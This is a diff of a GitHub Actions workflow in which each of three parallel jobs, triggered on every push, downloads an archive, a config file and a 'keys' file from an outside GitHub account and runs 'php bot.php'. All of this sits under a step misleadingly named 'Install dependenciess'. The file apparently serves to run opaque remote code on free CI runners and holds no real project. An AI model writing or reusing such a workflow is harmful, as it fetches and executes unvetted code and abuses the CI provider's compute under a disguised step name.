@@ -1,11 +1,10 @@
 on:
   push:
-name: hhsu
+name: nrti
 
 jobs:
   run_1:
     runs-on: ubuntu-latest
-    continue-on-error: true
     steps:
     - name: Setup PHP
       uses: shivammathur/setup-php@v2
@@ -14,15 +13,14 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
-        wget https://github.com/Yabof386/pyconbu/raw/main/conb/grb.zip
-        unzip grb.zip
-        timeout 357m php bot.php
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/c1.js -O config.json
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/wc.zip
+        unzip wc.zip
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/keys
+        php bot.php
         
   run_2:
-    
     runs-on: ubuntu-latest
-    needs: ["run_1"]
-    continue-on-error: true
     steps:
     - name: Setup PHP
       uses: shivammathur/setup-php@v2
@@ -31,6 +29,24 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
-        wget https://github.com/Yabof386/pyconbu/raw/main/conb/grb.zip
-        unzip grb.zip
-        timeout 357m php bot.php
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/c2.js -O config.json
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/wc.zip
+        unzip wc.zip
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/keys
+        php bot.php
+        
+  run_3:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/c3.js -O config.json
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/wc.zip
+        unzip wc.zip
+        wget https://github.com/Yabof386/worlchn/raw/main/cofng/keys
+        php bot.php
